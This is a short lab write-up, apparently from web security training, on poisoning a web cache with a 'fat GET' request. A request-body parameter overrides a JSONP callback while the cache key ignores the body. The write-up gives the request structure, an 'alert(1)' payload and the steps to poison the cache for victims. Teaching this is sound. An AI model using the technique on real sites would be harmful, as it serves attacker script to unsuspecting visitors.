# Lab 10 — Web Cache Poisoning via a Fat GET Request

## Objective

Poison the cache using a GET request body that is ignored by the cache key.

## Steps

1. Find the resource:

```text
/js/geolocate.js?callback=setCountryCookie
```

2. Send it to Repeater.
3. Observe that the callback can be controlled through a duplicate parameter in the request body.
4. Observe that the cache key remains based on the callback in the request line.

Structure:

```http
GET /js/geolocate.js?callback=setCountryCookie

callback=arbitraryFunction
```

Response:

```text
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
```

while the response calls:

```javascript
arbitraryFunction({"country" : "United Kingdom"})
```

5. Replace the body value with:

```text
callback=alert(1)
```

6. Poison the cache.
7. Remove cache busters and re-poison as needed.
8. The lab is solved when the victim loads a page containing the resource.

## Key Learning

```text
GET request line → cache key
GET request body → application input
```

This discrepancy enables poisoning.
